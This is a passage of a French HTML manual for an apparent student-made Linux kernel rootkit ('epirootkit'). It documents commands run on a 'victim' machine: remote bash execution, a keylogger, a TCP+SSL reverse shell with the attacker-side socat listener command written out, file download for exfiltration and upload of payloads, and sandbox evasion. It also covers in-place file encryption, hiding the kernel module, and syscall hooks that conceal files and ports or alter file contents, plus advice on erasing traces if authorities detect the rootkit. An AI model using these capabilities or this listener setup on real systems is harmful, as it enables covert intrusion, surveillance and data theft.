<li>Stockage sécurisé en interne sur la machine victime</li>
</ul>
<p><b>Exemple</b> </p><div class="fragment"><div class="line">passwd root</div>
</div><!-- fragment --><p></p>
</details>
<details  open="true">
<summary  id="exec">
<b>6. 🖥️ exec</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">exec [OPTIONS] [COMMAND]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Exécute du code Bash dans l'espace utilisateur (userland) de la machine victime.</p>
<p><b>Options</b></p><ul>
<li><b>-s</b> : Mode silencieux (évite l'affichage de la sortie, retourne uniquement le code de retour)</li>
</ul>
<p><b>Sortie par défaut</b></p><ul>
<li>Contenu de <em>stdout</em></li>
<li>Contenu de <em>stderr</em> <br  />
</li>
<li>Code de retour de la commande</li>
</ul>
<p><b>Exemples</b> </p><div class="fragment"><div class="line">exec ls                    # Liste les fichiers</div>
<div class="line">exec man man              # Affiche le manuel</div>
<div class="line">exec -s whoami            # Mode silencieux</div>
<div class="line">exec ping 8.8.8.8         # Test de connectivité</div>
</div><!-- fragment --><p></p>
</details>
<details  open="true">
<summary  id="klgon">
<b>7. 👁️ klgon</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">klgon</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Active le keylogger sur la machine victime.</p>
<p><b>Fonctionnement</b></p><ul>
<li>Enregistrement de toutes les frappes clavier</li>
<li>Fonctionnement en arrière-plan</li>
<li>Stockage des données pour récupération ultérieure</li>
</ul>
<blockquote class="doxtable">
<p>&zwj;<b>Note</b> : Utilisation du keylogger possible directement depuis l’onglet <a class="el" href="../../d9/dc4/md_pages_2fr_204__usage.html#keylogger">Keylogger</a> de l'interface web. </p>
</blockquote>
</details>
<details  open="true">
<summary  id="klgoff">
<b>8. 👁️ klgoff</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">klgoff</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Désactive le keylogger sur la machine victime.</p>
<p><b>Effet</b></p><ul>
<li>Arrêt immédiat de l'enregistrement des frappes</li>
<li>Les données déjà collectées restent disponibles</li>
</ul>
<blockquote class="doxtable">
<p>&zwj;<b>Note</b> : Utilisation du keylogger possible directement depuis l’onglet <a class="el" href="../../d9/dc4/md_pages_2fr_204__usage.html#keylogger">Keylogger</a> de l'interface web. </p>
</blockquote>
</details>
<details  open="true">
<summary  id="klg">
<b>9. 📝 klg</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">klg</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Récupère les frappes clavier enregistrées par le keylogger.</p>
<p><b>Format de sortie</b></p><ul>
<li><b>Contenu brut</b> sans mise en forme</li>
<li><b>Touches spéciales</b> représentées par des chaînes spécifiques<ul>
<li>Exemple : <code>_LSHIFT_</code> pour la touche Majuscule gauche</li>
</ul>
</li>
</ul>
<blockquote class="doxtable">
<p>&zwj;<b>Note</b> : Utilisation du keylogger et fonctionnalitées avancées disponibles directement depuis l’onglet <a class="el" href="../../d9/dc4/md_pages_2fr_204__usage.html#keylogger">Keylogger</a> de l'interface web. </p>
</blockquote>
</details>
<details  open="true">
<summary  id="getshell">
<b>10. 🐚 getshell</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">getshell [port]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Ouvre un shell inversé (reverse shell) sécurisé sur la machine cible en utilisant une connexion TCP+SSL.</p>
<p><b>Paramètres</b></p><ul>
<li><b>port</b> *(optionnel)* : Port de connexion personnalisé<ul>
<li><b>Défaut</b> : <code>9001</code></li>
<li><b>Exemple</b> : <code>getshell 9042</code> utilise le port 9042</li>
</ul>
</li>
</ul>
<p><b>Fonctionnement technique</b> <br  />
 Le reverse shell utilise un binaire <b>socat</b> compilé statiquement, intégré au module rootkit :</p>
<ol type="1">
<li><b>Déploiement</b> : Le binaire est installé dans <code>/var/lib/systemd/.epirootkit-hidden-fs/.sysd</code> lors de l'insertion du module</li>
<li><b>Connexion</b> : Établissement d'une connexion TCP+SSL vers l'attaquant sur le port spécifié</li>
<li><b>Exécution</b> : L'attaquant peut exécuter des commandes à distance comme s'il était connecté localement</li>
<li><b>Interactivité</b> : Shell complètement interactif grâce aux paramètres d'exécution spécifiques du binaire</li>
</ol>
<p><b>Configuration côté attaquant</b> <br  />
 L'attaquant doit avoir une instance socat en écoute avec le certificat SSL correspondant :</p>
<div class="fragment"><div class="line">socat openssl-listen:9042,reuseaddr,cert=&quot;$(pwd)&quot;/server.pem,verify=0 file:&quot;$(tty)&quot;,raw,echo=0</div>
</div><!-- fragment --><p><b>Interface web</b> <br  />
 Dans l'interface web :</p><ul>
<li>Spécifiez le port dans le champ dédié</li>
<li>Le serveur socat est lancé automatiquement en arrière-plan en utilisant le terminal <b>Kitty</b></li>
<li>Cliquez sur le bouton <b>Launch Shell</b> pour ouvrir le shell inversé</li>
</ul>
<blockquote class="doxtable">
<p>&zwj;<b>Note</b> : Le reverse shell est disponible directement depuis l’onglet <b>Shell</b> du <a class="el" href="../../d9/dc4/md_pages_2fr_204__usage.html#dashboard">Dashboard</a> de l'interface web. </p>
</blockquote>
</details>
<details  open="true">
<summary  id="killcom">
<b>11. 💀 killcom</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">killcom</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Coupe la communication avec le rootkit et supprime le module via <code>rmmod</code>.</p>
<p><b>Usage recommandé</b></p><ul>
<li><b>Développement et tests</b> uniquement</li>
<li><b>Production</b> : Utilisez plutôt <code>disconnect</code> pour une déconnexion simple.</li>
</ul>
<p><b>Effet destructeur</b> <br  />
 Cette commande détruit complètement le module, nécessitant une réinstallation sur la machine victime pour le réactiver.</p>
<blockquote class="doxtable">
<p>&zwj;S'il venait à arriver que le rootkit soit détecté par des outils spécialisés (par exemple par la DGSI ou Laurence C. ), la commande <code>killcom</code> peut alors s'avérer d'une grande utilité afin de supprimer toute trace du rootkit et disparaitre tel XDDL. </p>
</blockquote>
<p></p>
</details>
<details  open="true">
<summary  id="hide_module">
<b>12. 🙈 hide_module</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hide_module</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Masque le module noyau en le retirant de la liste chaînée des modules maintenue par le noyau Linux.</p>
<p><b>Avantages</b></p><ul>
<li>Indétectable par les outils système classiques</li>
<li>Persistance accrue du rootkit</li>
<li>Contournement des outils de détection standards</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="unhide_module">
<b>13. 👀 unhide_module</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">unhide_module</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Opération inverse de <a class="el" href="../../d0/dcb/epirootkit_8h.html#a6db046f8e25a3ddce7587005952b9f86">`hide_module`</a>. Rétablit le module précédemment masqué en le réinsérant dans la liste des modules du noyau.</p>
<p><b>Usage</b></p><ul>
<li>Permet la visibilité temporaire du module</li>
<li>Utile pour narguer les outils de détection lorque la partie de cache-cache est trop longue</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="get_file">
<b>14. 📥 download</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">download [PATH]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
</p><ul>
<li>Permet de transférer un fichier de la machine victime vers la machine attaquante.</li>
<li>Fonctionne de manière sécurisée en utilisant le protocole TCP+SSL.</li>
</ul>
<p><b>Paramètres</b></p><ul>
<li><b>PATH</b> : Chemin absolu du fichier sur le rootkit</li>
</ul>
<p><b>Fonctionnalités probables</b></p><ul>
<li>Exfiltration de données</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="upload">
<b>15. 📤 upload</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">upload [PATH] [SIZE]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
</p><ul>
<li>Permet de transférer un fichier de la machine attaquante vers la machine victime.</li>
<li>Fonctionne de manière sécurisée en utilisant le protocole TCP+SSL.</li>
</ul>
<p><b>Paramètres</b></p><ul>
<li><b>PATH</b> : Chemin absolu du fichier sur la machine attaquante</li>
<li><b>SIZE</b> : Taille du fichier en octets (lol, je ne suis pas responsable)</li>
</ul>
<p><b>Fonctionnalités probables</b></p><ul>
<li>Déploiement d'outils supplémentaires</li>
<li>Installation de payloads</li>
<li>Mise à jour du rootkit</li>
<li>Transfert de fichiers de configuration</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="sysinfo">
<b>16. 🧠 sysinfo</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">sysinfo</div>
</div><!-- fragment --><p><b>Description</b> <br  />
</p><ul>
<li>Affiche les informations système de la machine victime.</li>
</ul>
<p><b>Informations retournées</b></p><ul>
<li><b>architecture</b> : Architecture processeur</li>
<li><b>cpu_cores</b> : Nombre de cœurs CPU</li>
<li><b>cpu_model</b> : Modèle du processeur</li>
<li><b>hostname</b> : Nom d’hôte de la machine</li>
<li><b>ram_mb</b> : Quantité de RAM en Mo</li>
<li><b>release</b> : Version du noyau Linux</li>
<li><b>system</b> : Système d’exploitation</li>
<li><b>version</b> : Détail complet du noyau</li>
<li><b>virtual_env</b> : Indique si la machine est virtualisée</li>
</ul>
<p><b>Exemple de sortie</b> </p><div class="fragment"><div class="line">architecture: x86_64</div>
<div class="line">cpu_cores: 1</div>
<div class="line">cpu_model: QEMU Virtual CPU version 2.5+</div>
<div class="line">hostname: victim</div>
<div class="line">ram_mb: 3889</div>
<div class="line">release: 6.8.0-58-generic</div>
<div class="line">system: Linux</div>
<div class="line">version: &quot;#60~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Mar 28 16:09:21 UTC 2&quot;</div>
<div class="line">virtual_env: true</div>
</div><!-- fragment --> </details>
<details  open="true">
<summary  id="is_in_vm">
<b>17. 🖥️ is_in_vm</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">is_in_vm</div>
</div><!-- fragment --><p><b>Description</b> <br  />
</p><ul>
<li>Détecte si le rootkit s'exécute dans un environnement virtualisé.</li>
</ul>
<p><b>Détection possible</b></p><ul>
<li>Hyperviseurs (VMware, VirtualBox, Hyper-V)</li>
<li>Conteneurs Docker</li>
<li>Machines virtuelles cloud</li>
<li>Environnements de sandboxing</li>
</ul>
<p><b>Utilité</b></p><ul>
<li>Adaptation du comportement selon l'environnement</li>
<li>Évasion des analyses en bac à sable</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="cipher">
<b>18. 🛡️ cipher</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">cipher [FILENAME]</div>
</div><!-- fragment --><p><b>Description</b> Chiffre un fichier sur la machine victime en utilisant l'algorithme de chiffrement AES-128.</p>
<p><b>Paramètres</b></p><ul>
<li><b>FILENAME</b> : Chemin absolu du fichier à chiffrer</li>
</ul>
<p><b>Fonctionnement</b></p><ul>
<li>Utilise la clé de chiffrement stockée dans le module rootkit</li>
<li>Le fichier est chiffré en place, remplaçant le contenu original</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="uncipher">
<b>19. 🛡️ uncipher</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">uncipher [FILENAME]</div>
</div><!-- fragment --><p><b>Description</b> Déchiffre un fichier sur la machine victime en utilisant l'algorithme AES-128.</p>
<p><b>Paramètres</b></p><ul>
<li><b>FILENAME</b> : Chemin absolu du fichier à déchiffrer</li>
</ul>
<p><b>Fonctionnement</b></p><ul>
<li>Utilise la clé de chiffrement stockée dans le module rootkit</li>
<li>Le fichier est déchiffré en place, remplaçant le contenu originalement chiffré</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="hooks">
<b>20. 🪝 Hooks</b></summary>
<p></p>
<p><b>Vue d'ensemble des Hooks</b></p>
<p><b>Description générale</b> <br  />
 Le système de hooks permet d'intercepter les appels système (syscalls) sur la machine victime. Toutes les commandes de cette section doivent être précédées de <code>hooks</code>.</p>
<p><b>Fonctionnement</b> <br  />
 Des fichiers de configuration sont récupérés à chaque insertion du module et mis à jour régulièrement pour maintenir le comportement des altérations.</p>
<blockquote class="doxtable">
<p>&zwj;⚠️ <b>Important</b> <br  />
</p><ul>
<li>Les fonctionnalités sont <b>persistantes</b> <br  />
</li>
<li>Non affectées par un redémarrage système <br  />
</li>
<li>Maintenues tant que le module est inséré <br  />
</li>
<li>Configuration sauvegardée et rechargée automatiquement <br  />
 </li>
</ul>
</blockquote>
<p><b>Commandes Hooks disponibles</b></p>
<details  open="true">
<summary  id="hooks-help">
<b>hooks help</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks help</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Affiche un menu récapitulatif de toutes les commandes <code>hooks</code> disponibles.</p>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-hide">
<b>hooks hide</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks hide [PATH]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Masque un fichier ou un dossier spécifique en fournissant son chemin absolu.</p>
<p><b>Fonctionnement technique</b></p><ul>
<li>Interception du syscall <code>getdents64</code></li>
<li>Filtrage du contenu lors de l'énumération des fichiers</li>
<li>Masquage automatique des fichiers commençant par <code>stdbool_bypassed_ngl_</code></li>
</ul>
<p><b>Paramètres</b></p><ul>
<li><b>PATH</b> : Chemin absolu du fichier/dossier à masquer</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-unhide">
<b>hooks unhide</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks unhide [PATH]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Annule l'effet de la commande <code>hooks hide</code> en rendant à nouveau visible le fichier ou dossier ciblé.</p>
<p><b>Paramètres</b></p><ul>
<li><b>PATH</b> : Chemin absolu du fichier/dossier à révéler</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-list_hide">
<b>hooks list_hide</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks list_hide</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Affiche la liste complète des chemins absolus de tous les fichiers et répertoires masqués.</p>
<p><b>Utilité</b></p><ul>
<li>Audit des éléments cachés</li>
<li>Gestion centralisée des masquages</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-forbid">
<b>hooks forbid</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks forbid [PATH]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Interdit l'accès à un fichier ou dossier sans le masquer, même pour l'utilisateur root.</p>
<p><b>Syscalls interceptés</b></p><ul>
<li><code>openat</code>, <code>newfstatat</code>, <code>fstat</code>, <code>lstat</code>, <code>stat</code>, <code>chdir</code></li>
</ul>
<p><b>Comportement</b> <br  />
 Retourne l'erreur <code>-ENOENT</code> (<em>No such file or directory</em>) comme si l'élément n'existait pas.</p>
<p><b>Paramètres</b></p><ul>
<li><b>PATH</b> : Chemin absolu du fichier/dossier à interdire</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-unforbid">
<b>hooks unforbid</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks unforbid [PATH]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Annule l'effet de la commande <code>hooks forbid</code>.</p>
<p><b>Paramètres</b></p><ul>
<li><b>PATH</b> : Chemin absolu du fichier/dossier à débloquer</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-list_forbid">
<b>hooks list_forbid</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks list_forbid</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Affiche la liste complète des chemins absolus de tous les fichiers et répertoires interdits.</p>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-modify">
<b>hooks modify</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks modify [PATH] [hide_line=N] [hide_substr=TXT] [replace=SRC:DST]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Interception de l'appel système <code>read()</code> permettant de modifier dynamiquement le contenu des fichiers.</p>
<p><b>Fonctionnalités</b></p><ul>
<li><b>Masquer une ligne précise</b> : <code>hide_line=N</code></li>
<li><b>Masquer les lignes contenant un mot-clé</b> : <code>hide_substr=TXT</code></li>
<li><b>Remplacer des mots-clés</b> : <code>replace=SRC:DST</code></li>
</ul>
<p><b>Paramètres</b></p><ul>
<li><b>PATH</b> : Chemin absolu du fichier (obligatoire)</li>
<li><b>hide_line</b> : Numéro de ligne à masquer</li>
<li><b>hide_substr</b> : Sous-chaîne à masquer dans toutes les lignes</li>
<li><b>replace</b> : Remplacement au format <code>source:destination</code></li>
</ul>
<p><b>Limitations</b> <br  />
</p><ul>
<li>Comportement imprévisible avec des fichiers très longs</li>
<li>Les espaces ne sont pas pris en charge</li>
<li>Fonctionnement primitif</li>
</ul>
<p><b>Exemples</b> </p><div class="fragment"><div class="line">hooks modify /home/victim/test.txt hide_line=3 hide_substr=claire replace=efrei:epita</div>
<div class="line">hooks modify /home/victim/test.txt hide_substr=claire replace=efrei:epita</div>
<div class="line">hooks modify /home/victim/test.txt replace=efrei:epita hide_substr=claire</div>
<div class="line">hooks modify /home/victim/test.txt hide_substr=claire hide_line=10</div>
<div class="line">hooks modify /home/victim/test.txt hide_line=1</div>
</div><!-- fragment --><p></p>
</details>
<details  open="true">
<summary  id="hooks-unmodify">
<b>hooks unmodify</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks unmodify [PATH]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Annule l'effet de la commande <code>hooks modify</code>.</p>
<p><b>Paramètres</b></p><ul>
<li><b>PATH</b> : Chemin absolu du fichier à restaurer</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-list_modify">
<b>hooks list_modify</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks list_modify</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Affiche la liste complète des chemins absolus de tous les fichiers modifiés.</p>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-add_port">
<b>hooks add_port</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks add_port [PORT]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Masque des ports spécifiques dans les fichiers système et les outils réseau.</p>
<p><b>Cibles affectées</b></p><ul>
<li>Fichiers <code>/proc/net/tcp*</code></li>
<li>Commandes <code>ss</code></li>
<li>Commandes <code>netstat</code></li>
</ul>
<p><b>Comportement</b> <br  />
 Masque toutes les lignes mentionnant un port source ou destination égal à <code>[PORT]</code>.</p>
<p><b>Paramètres</b></p><ul>
<li><b>PORT</b> : Numéro de port à masquer</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-remove_port">
<b>hooks remove_port</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks remove_port [PORT]</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Annule l'effet de la commande <code>hooks add_port</code>.</p>
<p><b>Paramètres</b></p><ul>
<li><b>PORT</b> : Numéro de port à révéler</li>
</ul>
<p></p>
</details>
<details  open="true">
<summary  id="hooks-list_port">
<b>hooks list_port</b></summary>
<p></p>
<p><b>Syntaxe</b> </p><div class="fragment"><div class="line">hooks list_port</div>
</div><!-- fragment --><p><b>Description</b> <br  />
 Affiche la liste complète de tous les ports actuellement masqués.</p>
<p></p>
</details>
<p></p>
</details>
<p><img src="../../logo_no_text.png" alt="" style="
    display: block;
    margin: 100px auto;
    width: 30%;
    overflow: hidden;
  " class="inline"/></p>
<div class="section_buttons"></div><div class="section_buttons"><table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadLeft">Previous   </th><th class="markdownTableHeadRight">Next    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyLeft"><a class="el" href="../../dd/dc9/md_pages_2fr_203__install.html">Mise en place</a>   </td><td class="markdownTableBodyRight"><a class="el" href="../../dd/d6f/md_pages_2fr_205__env.html">Environnement</a>   </td></tr>
</table>
</div> </div></div><!-- contents -->
</div><!-- PageDoc -->
</div><!-- doc-content -->

<div id="nav-path" class="navpath"><!-- id is needed for treeview function! --></div>
</body>
</html>
